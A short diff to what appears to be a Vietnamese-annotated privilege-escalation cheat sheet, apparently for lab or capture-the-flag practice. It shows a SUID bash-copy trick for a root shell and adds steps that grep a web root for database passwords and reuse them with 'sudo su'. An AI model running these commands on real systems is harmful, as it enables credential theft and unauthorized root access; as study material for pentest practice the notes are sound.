@@ -263,6 +263,13 @@ cp /bin/bash <file2>				(nếu ko đc thì rm rồi cp lại, copy shell vào th
 ./<file1>							(Từ đó chạy file 1 sẽ mở shell với quyền root vì lúc đầu file đó đã có quyền root)
 
 ---------------------------------------------------------------------------------------------------------------------
+cd /var/www/html
+grep -nr "db_user"			(ví dụ output ./<file>php:10:$db_user = "root";)
+grep -nr "password"
+grep -nr "passwd"					
+					
+cat <file>					(tìm xem có pwd ko)
+sudo su 					(sau đó nhập pwd vừa tìm được)
 
 
 ```
